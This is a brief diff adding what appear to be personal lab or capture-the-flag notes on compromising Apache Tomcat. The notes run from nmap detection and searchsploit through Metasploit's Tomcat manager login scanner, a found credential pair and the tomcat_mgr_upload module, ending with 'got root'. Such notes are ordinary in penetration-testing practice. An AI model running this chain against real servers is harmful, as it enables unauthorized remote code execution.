@@ -1,0 +1,6 @@
+Apache Tomcat/Coyote JSP engine 1.1	//nmap
+searchsploit tomcat
+msfconsole
+use scanner/http/tomcat_mgr_login
+tomcat:s3cret
+use multi/http/tomcat_mgr_upload	//got root
